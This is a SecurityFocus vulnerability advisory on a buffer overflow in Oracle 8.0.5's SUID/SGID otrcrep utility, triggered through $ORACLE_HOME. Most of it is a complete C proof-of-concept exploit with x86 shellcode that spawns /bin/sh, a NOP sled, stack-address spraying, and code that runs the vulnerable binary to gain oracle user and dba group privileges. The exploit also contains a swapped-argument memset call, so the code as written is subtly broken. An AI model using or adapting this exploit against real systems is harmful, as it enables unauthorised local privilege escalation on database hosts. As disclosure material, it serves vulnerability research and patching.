source: http://www.securityfocus.com/bid/3139/info

Oracle is an Enterprise level SQL database, supporting numerous features and options. It is distributed and maintained by Oracle Corporation.

A buffer overflow has been discovered in the handling of $ORACLE_HOME by otrcrep. otrcrep is installed with the Oracle suite as a SUID oracle SGID dba binary. This buffer overflow may be exploited by a local user to overwrite stack variables, including the return address, and execute arbitrary code with the privileges of user oracle and group dba.

/*
 * This vulnerability was researched by:
 * Juan Manuel Pascual Escriba <pask@plazasite.com>
 * cc -o evolut otrcrep.c; ./evolut 300 0
 */

#include <stdio.h>
#include <stdlib.h>

#define BUFFER		               300 
#define OFFSET			       0 
#define NOP                            0x90
#define BINARY	"/home/oracle/app/oracle/product/8.0.5/bin/otrcrep a $EGG"
#define ORACLE_HOME "/home/oracle/app/oracle/product/8.0.5"


char shellcode[] =
  "\xeb\x1d"
  "\x5e"
  "\x29\xc0"
  "\x88\x46\x07"
  "\x89\x46\x0c"
  "\x89\x76\x08"
  "\xb0\x0b"
  "\x87\xf3"
  "\x8d\x4b\x08"
  "\x8d\x53\x0c"
  "\xcd\x80"
  "\x29\xc0"
  "\x40"
  "\xcd\x80"
  "\xe8\xde\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

 /* void main(int argc, char *argv[]) { */
void main() {
  char *buff, *ptr,binary[120];
  long *addr_ptr, addr;
  int bsize=BUFFER;
  int i,offset=OFFSET;

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_sp() -1420 -offset;
  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  memset(buff,bsize/2,NOP);

ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';
setenv("ORACLE_HOME",ORACLE_HOME,1);
setenv("EGG",buff,1);  
system(BINARY);  
}